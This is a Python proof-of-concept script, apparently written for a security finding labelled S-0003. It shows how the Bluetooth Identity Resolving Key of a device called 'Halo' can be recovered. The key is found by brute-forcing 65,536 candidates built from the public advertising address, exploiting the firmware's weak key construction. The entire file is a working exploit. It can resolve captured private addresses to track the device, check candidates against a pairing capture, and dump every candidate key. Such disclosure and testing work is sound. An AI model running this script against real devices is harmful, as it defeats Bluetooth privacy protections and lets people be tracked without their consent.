# /// script
# requires-python = ">=3.10"
# dependencies = ["pycryptodome>=3.20"]
# ///
"""
S-0003 PoC: recover the Halo IRK from its public static advertising address.

Firmware derives the IRK as EUI-64-forwards ++ EUI-64-reversed, where the EUI-64 is
2C:F7:F1 + 5 extension bytes — and 3 of those 5 bytes are exposed in the device's
permanently-advertised static address. Only 2 bytes of entropy remain.

    uv run derive_irk.py C0:59:94:AA:BB:CC
    uv run derive_irk.py C0:59:94:AA:BB:CC --confirm <irk-hex-from-btmon>
    uv run derive_irk.py C0:59:94:AA:BB:CC --resolve <rpa-address-from-capture>

Address order: pass the address as printed by bluetoothctl/nRF Connect
(MSB first, e.g. C0:59:94:AA:BB:CC).
"""
import argparse
import itertools
import sys

from Crypto.Cipher import AES
from Crypto.Hash import CMAC

OUI = bytes([0x2C, 0xF7, 0xF1])  # ble_security.c halo_ble_sec_init()


def irk_from_ext(ext: bytes) -> bytes:
    """Firmware method: EUI-64 forward ++ EUI-64 reversed (ble_security.c:400)."""
    eui64 = OUI + ext
    return eui64 + eui64[::-1]


def ext_from_static_address(addr_msbf: str) -> bytes:
    """Last 3 bytes of the on-air static address are eui_ext[0..2]
    (ble_connection.c alif_eui48_read(), reversed on air)."""
    parts = bytes(int(p, 16) for p in addr_msbf.split(":"))
    if len(parts) != 6:
        raise SystemExit("need 6-byte address AA:BB:CC:DD:EE:FF")
    return parts[3:6]  # MSB-first view == eui_ext[0..2]


def ah(irk: bytes, prand: bytes) -> bytes:
    """Bluetooth ah() (Vol 3 Part H): AES-CMAC with key=IRK over prand padded to
    16 bytes. Message is prand (3 bytes) zero-padded on the LEFT per spec
    (prand placed in the least significant octets)."""
    msg = prand.rjust(16, b"\x00")
    c = CMAC.new(irk, ciphermod=AES)
    c.update(msg)
    return c.digest()[:3]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("address", help="Halo static address, MSB first")
    ap.add_argument("--confirm", metavar="IRK_HEX",
                    help="IRK observed during a real pairing (btmon); "
                         "find the hidden ext bytes that produce it")
    ap.add_argument("--resolve", metavar="RPA_ADDR",
                    help="resolvable private address from a capture; test all "
                         "candidates with Bluetooth ah()")
    args = ap.parse_args()

    ext_pub = ext_from_static_address(args.address)
    print(f"[*] Static address {args.address} -> EUI ext bytes on air: "
          f"{ext_pub.hex(':')}")
    print(f"[*] EUI-64 entropy remaining: 2 bytes (65536 candidates)")

    hidden = range(256)
    candidates = 0

    if args.confirm:
        want = bytes.fromhex(args.confirm.replace(":", ""))
        if len(want) != 16:
            raise SystemExit("--confirm needs 16 bytes of IRK (hex)")
        # Full 8-byte EUI extension layout: [b3, b4, ext0, ext1, ext2] — the two
        # hidden bytes sit between the OUI and the 3 public ones.
        for b3, b4 in itertools.product(hidden, hidden):
            if irk_from_ext(bytes([b3, b4]) + ext_pub) == want:
                print(f"[+] CONFIRMED: hidden ext bytes {b3:02X} {b4:02X}")
                print("[VULNERABLE] IRK recovered from 2^16 space using only "
                      "the public advertising address")
                return 1
        print("[-] No candidate produced the observed IRK (patched or "
              "different derivation)")
        return 0

    if args.resolve:
        rpa = bytes(int(p, 16) for p in args.resolve.split(":"))
        if len(rpa) != 6:
            raise SystemExit("--resolve needs AA:BB:CC:DD:EE:FF")
        prand, observed = rpa[3:][::-1][:3], rpa[:3][::-1][:3]
        # RPA layout (Vol 6 Part B 1.3.2.2): address = hash[3] || prand[3],
        # prand = random with top 2 bits '01', both little-endian on air.
        prand_le = rpa[3:6]
        hash_le = rpa[0:3]
        for b3, b4 in itertools.product(hidden, hidden):
            irk = irk_from_ext(bytes([b3, b4]) + ext_pub)
            if ah(irk, prand_le[::-1]) == hash_le[::-1]:
                print(f"[+] RPA resolved — IRK candidate with ext {b3:02X} {b4:02X}")
                print("[VULNERABLE] device trackable; IRK space exhausted in seconds")
                return 1
        print("[-] No candidate resolved the RPA")
        return 0

    # Default: enumerate and dump (1 MiB) for offline verification.
    with open("candidates.bin", "wb") as f:
        for b3, b4 in itertools.product(hidden, hidden):
            f.write(irk_from_ext(bytes([b3, b4]) + ext_pub))
            candidates += 1
    print(f"[*] Wrote candidates.bin ({candidates * 16} bytes)")
    print("[*] sample: ext=00:00 -> IRK",
          irk_from_ext(bytes([0, 0]) + ext_pub).hex())
    print("[*] Pair your phone once with `sudo btmon -w cap.snoop` running, "
          "extract the distributed IRK, then re-run with --confirm")
    return 0


if __name__ == "__main__":
    sys.exit(main())
